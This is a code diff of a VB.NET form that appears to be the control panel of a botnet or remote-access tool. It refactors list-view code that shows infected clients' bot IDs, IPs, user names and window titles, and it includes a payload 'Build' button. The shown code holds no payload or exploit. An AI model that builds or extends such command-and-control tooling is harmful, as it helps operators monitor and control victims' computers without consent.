@@ -53,15 +53,7 @@ Public Class frmmain
     End Sub
 #End Region
 
-    Public Sub Log(ByVal txt As String)
-        If txtLog.InvokeRequired Then
-            Dim d As New SafeLog(AddressOf Log)
-            txtLog.Invoke(d, New Object() {txt})
-        Else
-            txtLog.Text = txtLog.Text & DateTime.Now.ToString("[dd/MM/yyyy HH:mm:ss] ") & txt & vbCrLf
-        End If
-    End Sub
-
+#Region "Client ListView"
     Private Function Client_Listview_Init()
         With lvClient
             .View = View.Details
@@ -82,6 +74,81 @@ Public Class frmmain
         End With
         Return True
     End Function
+
+    Private Function AddClientToListview(ByVal Client As clsClientObj)
+        Dim clientInfo As structClientInfo = Client.GetClientInfo()
+
+        'Add data to listview
+        Dim data(5) As String
+        data(0) = clientInfo.countryCode
+        data(1) = clientInfo.botID
+        data(2) = clientInfo.IP
+        data(3) = clientInfo.windowVersion
+        data(4) = clientInfo.computerUserName
+        data(5) = clientInfo.WindowTitle
+        Dim itm As ListViewItem = New ListViewItem(data)
+        itm.ImageIndex = GetIndexByCountryCode(clientInfo.countryCode)
+        'lvClient.Items.Insert(lvClient.Items.Count, itm)
+        lvClient.Items.Add(itm)
+        Return True
+    End Function
+
+    Private Function UpdateClientToListview(ByVal Client As clsClientObj, ByVal index As Integer)
+        Dim clientInfo As structClientInfo = Client.GetClientInfo()
+
+        'Edit data from listview
+
+        lvClient.Items.Item(index).SubItems.Item(0).Text = clientInfo.countryCode
+        lvClient.Items.Item(index).SubItems.Item(1).Text = clientInfo.botID
+        lvClient.Items.Item(index).SubItems.Item(2).Text = clientInfo.IP
+        lvClient.Items.Item(index).SubItems.Item(3).Text = clientInfo.windowVersion
+        lvClient.Items.Item(index).SubItems.Item(4).Text = clientInfo.computerUserName
+        lvClient.Items.Item(index).SubItems.Item(5).Text = clientInfo.WindowTitle
+        lvClient.Items.Item(index).ImageIndex = GetIndexByCountryCode(clientInfo.countryCode)
+
+        Return True
+    End Function
+
+    Private Sub SyncClientListView()
+        Dim ClientList As List(Of clsClientObj) = clientMgr.GetAcceptedClientList()
+
+        If ClientList.Count > lvClient.Items.Count Then
+            'Fix this...
+            Dim i As Integer
+            For i = lvClient.Items.Count To ClientList.Count - 1
+                AddClientToListview(ClientList(i))
+            Next
+        ElseIf ClientList.Count < lvClient.Items.Count Then
+            If ClientList.Count = 0 Then
+                lvClient.Items.Clear()
+            Else
+                For Each item As ListViewItem In lvClient.Items
+                    For Each client In ClientList
+                        If client.GetClientInfo().botID <> item.SubItems(1).Text Or
+                        client.GetClientInfo().computerUserName <> item.SubItems(4).Text Then
+                            lvClient.Items.Remove(item)
+                        End If
+                    Next
+                Next
+            End If
+        Else
+            Dim i As Integer = 0
+            For Each ClientObj As clsClientObj In ClientList
+                UpdateClientToListview(ClientObj, i)
+                i += 1
+            Next
+        End If
+    End Sub
+#End Region
+
+    Public Sub Log(ByVal txt As String)
+        If txtLog.InvokeRequired Then
+            Dim d As New SafeLog(AddressOf Log)
+            txtLog.Invoke(d, New Object() {txt})
+        Else
+            txtLog.Text = txtLog.Text & DateTime.Now.ToString("[dd/MM/yyyy HH:mm:ss] ") & txt & vbCrLf
+        End If
+    End Sub
 
     Private Function Setting_Init() As Boolean
         If mSettings.ReadSettings() = False Then
@@ -154,41 +221,8 @@ Public Class frmmain
         Timer_Init()
         TCP_Init()
         ClientMgr_Init()
+        RefreshBLockIPListBox()
         Log("Program has been started!")
-        Return True
-    End Function
-
-    Private Function AddClientToListview(ByVal Client As clsClientObj)
-        Dim clientInfo As structClientInfo = Client.GetClientInfo()
-
-        'Add data to listview
-        Dim data(5) As String
-        data(0) = clientInfo.countryCode
-        data(1) = clientInfo.botID
-        data(2) = clientInfo.IP
-        data(3) = clientInfo.windowVersion
-        data(4) = clientInfo.computerUserName
-        data(5) = clientInfo.WindowTitle
-        Dim itm As ListViewItem = New ListViewItem(data)
-        itm.ImageIndex = GetIndexByCountryCode(clientInfo.countryCode)
-        'lvClient.Items.Insert(lvClient.Items.Count, itm)
-        lvClient.Items.Add(itm)
-        Return True
-    End Function
-
-    Private Function UpdateClientToListview(ByVal Client As clsClientObj, ByVal index As Integer)
-        Dim clientInfo As structClientInfo = Client.GetClientInfo()
-
-        'Edit data from listview
-
-        lvClient.Items.Item(index).SubItems.Item(0).Text = clientInfo.countryCode
-        lvClient.Items.Item(index).SubItems.Item(1).Text = clientInfo.botID
-        lvClient.Items.Item(index).SubItems.Item(2).Text = clientInfo.IP
-        lvClient.Items.Item(index).SubItems.Item(3).Text = clientInfo.windowVersion
-        lvClient.Items.Item(index).SubItems.Item(4).Text = clientInfo.computerUserName
-        lvClient.Items.Item(index).SubItems.Item(5).Text = clientInfo.WindowTitle
-        lvClient.Items.Item(index).ImageIndex = GetIndexByCountryCode(clientInfo.countryCode)
-
         Return True
     End Function
 
@@ -236,42 +270,13 @@ Public Class frmmain
 
     End Sub
 
-    Private Sub SyncClientListView()
-        Dim ClientList As List(Of clsClientObj) = clientMgr.GetAcceptedClientList()
-
-        If ClientList.Count > lvClient.Items.Count Then
-            Dim i As Integer
-            For i = lvClient.Items.Count To ClientList.Count - 1
-                AddClientToListview(ClientList(i))
-            Next
-        ElseIf ClientList.Count < lvClient.Items.Count Then
-            If ClientList.Count = 0 Then
-                lvClient.Items.Clear()
-            Else
-                For Each item As ListViewItem In lvClient.Items
-                    For Each client In ClientList
-                        If client.GetClientInfo().botID <> item.SubItems(1).Text Or
-                        client.GetClientInfo().computerUserName <> item.SubItems(4).Text Then
-                            lvClient.Items.Remove(item)
-                        End If
-                    Next
-                Next
-            End If
-        Else
-            Dim i As Integer = 0
-            For Each ClientObj As clsClientObj In ClientList
-                UpdateClientToListview(ClientObj, i)
-                i += 1
-            Next
-        End If
-    End Sub
-
     Private Sub UpdateClientInfo()
         Dim ClientList As List(Of clsClientObj) = clientMgr.GetAcceptedClientList()
         For Each ClientObj As clsClientObj In ClientList
             ClientObj.UpdateInfo()
         Next
     End Sub
+
 
     Private Sub cmdListen_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdListen.Click
         frmListen.ShowDialog()
@@ -384,7 +389,7 @@ Public Class frmmain
                         "VC-LTL by Chuyu Team" & vbCrLf &
                         "DllToShellcode by Killeven" & vbCrLf & vbCrLf &
                         "Thank to" & vbCrLf &
-                        ":P"
+                        "CD Team"
     End Sub
 
     Private Sub cmdBuild_Click(sender As Object, e As EventArgs) Handles cmdBuild.Click
